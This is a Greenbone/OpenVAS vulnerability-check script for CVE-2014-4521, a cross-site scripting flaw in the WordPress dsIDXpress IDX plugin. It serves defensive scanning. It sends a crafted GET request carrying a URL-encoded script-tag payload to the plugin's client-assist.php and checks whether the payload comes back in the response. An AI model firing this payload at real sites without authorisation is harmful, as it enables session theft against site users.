CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804803" );
	script_version( "2019-11-12T13:33:43+0000" );
	script_cve_id( "CVE-2014-4521" );
	script_bugtraq_id( 68328 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2019-11-12 13:33:43 +0000 (Tue, 12 Nov 2019)" );
	script_tag( name: "creation_date", value: "2014-08-11 10:21:09 +0530 (Mon, 11 Aug 2014)" );
	script_name( "WordPress dsIDXpress IDX Plugin Cross Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with WordPress dsIDXpress IDX Plugin and is prone to
cross-site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not." );
	script_tag( name: "insight", value: "Input passed via the 'action' GET parameter to client-assist.php script is not
properly sanitised before returning to the user." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attacker to execute arbitrary script
code in a user's browser session within the trust relationship between their
browser and the server." );
	script_tag( name: "affected", value: "WordPress dsIDXpress IDX Plugin version 2.1.0 and prior." );
	script_tag( name: "solution", value: "Update to WordPress dsIDXpress IDX Plugin version 2.1.1 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://wordpress.org/plugins/dsidxpress/changelog/" );
	script_xref( name: "URL", value: "http://codevigilant.com/disclosure/wp-plugin-dsidxpress-a3-cross-site-scripting-xss/" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/dsidxpress/client-assist.php?action=%27%3" + "E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\)</script>", extra_check: ">Warning<" )){
	security_message( http_port );
	exit( 0 );
}

